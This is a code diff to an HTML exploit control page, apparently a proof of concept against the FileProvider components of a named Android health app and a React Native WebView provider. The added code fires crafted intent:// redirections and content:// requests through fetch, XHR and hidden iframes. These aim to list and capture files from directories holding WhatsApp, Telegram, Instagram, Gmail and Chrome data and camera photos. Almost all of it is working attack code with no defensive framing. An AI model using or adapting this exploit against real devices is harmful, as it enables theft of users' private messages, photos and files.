@@ -232,6 +232,7 @@
                 <h2>🚀 Exploitation Controls</h2>
                 <button class="button danger" onclick="startExploitation()">Start FileProvider Exploitation</button>
                 <button class="button success" onclick="testIntentRedirection()">🔥 Test Intent Redirection (WORKING!)</button>
+                <button class="button" onclick="testFileListing()">📁 Test File Listing</button>
                 <button class="button" onclick="testWebViewExploit()">Test WebView Exploit</button>
                 <button class="button" onclick="clearResults()">Clear Results</button>
                 
@@ -557,6 +558,9 @@ Android/data/com.android.chrome/ - Chrome data
                         window.location = maliciousIntent;
                         log(`[SUCCESS] Intent redirection triggered: ${maliciousIntent}`, 'success');
                         
+                        // Try to capture response or file listing
+                        attemptFileListing(authority, path);
+                        
                         // Wait a moment then try iframe method
                         setTimeout(() => {
                             try {
@@ -565,6 +569,18 @@ Android/data/com.android.chrome/ - Chrome data
                                 iframe.style.display = 'none';
                                 iframe.onload = () => {
                                     log(`[SUCCESS] Intent redirection via iframe successful`, 'success');
+                                    // Try to read iframe content for file listings
+                                    try {
+                                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                                        if (iframeDoc && iframeDoc.body) {
+                                            const content = iframeDoc.body.innerHTML;
+                                            if (content && content.length > 0) {
+                                                log(`[SUCCESS] Iframe content captured: ${content.substring(0, 200)}...`, 'success');
+                                            }
+                                        }
+                                    } catch (e) {
+                                        log(`[INFO] Cross-origin restriction prevents iframe content reading`, 'info');
+                                    }
                                 };
                                 iframe.onerror = () => {
                                     log(`[FAILED] Intent redirection via iframe failed`, 'error');
@@ -587,6 +603,99 @@ Android/data/com.android.chrome/ - Chrome data
                     
                     // Small delay between attempts
                     setTimeout(() => {}, 500);
+                });
+            });
+        }
+
+        async function attemptFileListing(authority, path) {
+            log(`[ATTEMPTING FILE LISTING] ${authority}/${path}`, 'info');
+            
+            // Try different methods to get file listings
+            const methods = [
+                // Method 1: Direct content URI access
+                `content://${authority}/${path}`,
+                // Method 2: With query parameters
+                `content://${authority}/${path}?list=true`,
+                // Method 3: With directory listing intent
+                `intent://${authority}/${path}#Intent;action=android.intent.action.VIEW;scheme=content;end`,
+                // Method 4: With file manager intent
+                `intent://${authority}/${path}#Intent;action=android.intent.action.VIEW;type=*/*;scheme=content;end`
+            ];
+            
+            for (let i = 0; i < methods.length; i++) {
+                const method = methods[i];
+                log(`[METHOD ${i + 1}] ${method}`, 'info');
+                
+                try {
+                    if (method.startsWith('content://')) {
+                        // Try fetch
+                        const response = await fetch(method);
+                        if (response.ok) {
+                            const content = await response.text();
+                            log(`[SUCCESS] File listing via fetch: ${content.substring(0, 300)}...`, 'success');
+                        } else {
+                            log(`[FAILED] Fetch failed: ${response.status}`, 'error');
+                        }
+                        
+                        // Try XMLHttpRequest
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('GET', method, false);
+                        xhr.send();
+                        if (xhr.status === 200) {
+                            log(`[SUCCESS] File listing via XHR: ${xhr.responseText.substring(0, 300)}...`, 'success');
+                        } else {
+                            log(`[FAILED] XHR failed: ${xhr.status}`, 'error');
+                        }
+                    } else if (method.startsWith('intent://')) {
+                        // Try intent-based file listing
+                        try {
+                            window.location = method;
+                            log(`[SUCCESS] Intent-based file listing triggered`, 'success');
+                        } catch (error) {
+                            log(`[FAILED] Intent-based file listing failed: ${error.message}`, 'error');
+                        }
+                    }
+                } catch (error) {
+                    log(`[FAILED] Method ${i + 1} error: ${error.message}`, 'error');
+                }
+                
+                // Small delay between methods
+                await new Promise(resolve => setTimeout(resolve, 200));
+            }
+        }
+
+        function testFileListing() {
+            log('Testing File Listing Capabilities...', 'warning');
+            
+            const authorities = [
+                "com.reactnativecommunity.webview.RNCWebViewFileProvider",
+                "de.hellobetter.companion.fileprovider",
+                "de.hellobetter.companion.SharingFileProvider"
+            ];
+            
+            const directories = [
+                "shared/Download/",
+                "shared/Documents/",
+                "shared/DCIM/Camera/",
+                "shared/Android/data/com.whatsapp/",
+                "shared/Android/data/com.telegram.messenger/",
+                "shared/Android/data/com.facebook.katana/",
+                "shared/Android/data/com.instagram.android/",
+                "shared/Android/data/com.google.android.gm/",
+                "shared/Android/data/com.android.chrome/"
+            ];
+            
+            authorities.forEach((authority, authIndex) => {
+                log(`\n[TESTING FILE LISTING] ${authority}`, 'warning');
+                
+                directories.forEach((dir, dirIndex) => {
+                    log(`\n[DIRECTORY ${authIndex + 1}.${dirIndex + 1}] ${dir}`, 'info');
+                    
+                    // Try multiple file listing methods
+                    attemptFileListing(authority, dir);
+                    
+                    // Small delay between directories
+                    setTimeout(() => {}, 300);
                 });
             });
         }
